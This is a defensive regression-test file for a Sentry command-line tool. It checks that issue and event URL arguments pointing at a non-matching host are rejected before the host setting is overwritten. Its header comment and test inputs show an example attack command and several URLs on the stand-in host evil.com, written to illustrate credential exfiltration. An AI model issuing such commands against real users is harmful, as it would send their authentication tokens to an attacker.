/**
 * CVE regression: URL argument attack.
 *
 * Attack: `sentry issue view https://evil.com/organizations/x/issues/1/`
 * previously wrote `env.SENTRY_HOST=https://evil.com` with no validation,
 * causing every subsequent authenticated fetch + OAuth refresh to send
 * credentials to the attacker.
 *
 * Fix (this PR): `applySentryUrlContext` rejects non-SaaS URLs that don't
 * match the active token's scoped host. Only `sentry auth login --url <url>`
 * can establish trust for a new host.
 */

import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { parsePositionalArgs } from "../../../src/commands/event/view.js";
import {
  parseIssueArg,
  parseOrgProjectArg,
} from "../../../src/lib/arg-parsing.js";
import { resetEnvTokenHostForTesting } from "../../../src/lib/env-token-host.js";
import { useEnvSandbox } from "../../helpers.js";

const ENV_KEYS = ["SENTRY_HOST", "SENTRY_URL"] as const;

describe("CVE: URL argument credential exfiltration", () => {
  useEnvSandbox(ENV_KEYS);

  beforeEach(resetEnvTokenHostForTesting);
  afterEach(resetEnvTokenHostForTesting);

  test("parseIssueArg with attacker URL throws before env is poisoned (SaaS-scoped token)", () => {
    // preload sets SENTRY_AUTH_TOKEN; env-token defaults to SaaS.
    expect(() =>
      parseIssueArg("https://evil.com/organizations/target-org/issues/12345/")
    ).toThrow(/does not match|sentry auth login --url/);

    // Env untouched — no routing poison.
    expect(process.env.SENTRY_HOST).toBeUndefined();
    expect(process.env.SENTRY_URL).toBeUndefined();
  });

  test("parseOrgProjectArg with attacker URL throws before env is poisoned", () => {
    expect(() =>
      parseOrgProjectArg(
        "https://evil.com/organizations/target-org/issues/12345/"
      )
    ).toThrow(/does not match|sentry auth login --url/);

    expect(process.env.SENTRY_HOST).toBeUndefined();
    expect(process.env.SENTRY_URL).toBeUndefined();
  });

  test("event view with attacker URL throws before env is poisoned", () => {
    expect(() =>
      parsePositionalArgs([
        "https://evil.com/organizations/acme/issues/999/events/deadbeef/",
      ])
    ).toThrow(/does not match|sentry auth login --url/);

    expect(process.env.SENTRY_HOST).toBeUndefined();
    expect(process.env.SENTRY_URL).toBeUndefined();
  });

  test("share URL from attacker host throws (CVE #3: custom-headers leak)", () => {
    // The share-URL variant of the CVE. parseIssueArg still runs
    // applySentryUrlContext, which throws before getSharedIssue is invoked.
    expect(() =>
      parseIssueArg(
        "https://evil.com/share/issue/deadbeef12345678deadbeef12345678/"
      )
    ).toThrow(/does not match|sentry auth login --url/);

    expect(process.env.SENTRY_HOST).toBeUndefined();
    expect(process.env.SENTRY_URL).toBeUndefined();
  });

  test("SaaS URL arg proceeds even when SENTRY_HOST is currently set to self-hosted", () => {
    // SaaS URLs always proceed — they're part of the SaaS trust class
    // when the active token is SaaS-scoped, and they clear env to route
    // correctly.
    process.env.SENTRY_HOST = "https://old-self-hosted.example.com";
    process.env.SENTRY_URL = "https://old-self-hosted.example.com";
    parseIssueArg("https://sentry.io/organizations/acme/issues/1234/");
    // env cleared so default SaaS routing takes over
    expect(process.env.SENTRY_HOST).toBeUndefined();
    expect(process.env.SENTRY_URL).toBeUndefined();
  });

  test("matching self-hosted URL arg is honored when token scoped to that host", () => {
    process.env.SENTRY_HOST = "https://sentry.example.com";
    resetEnvTokenHostForTesting();
    parseOrgProjectArg(
      "https://sentry.example.com/organizations/acme/issues/1/"
    );
    expect(process.env.SENTRY_HOST).toBe("https://sentry.example.com");
    expect(process.env.SENTRY_URL).toBe("https://sentry.example.com");
  });
});
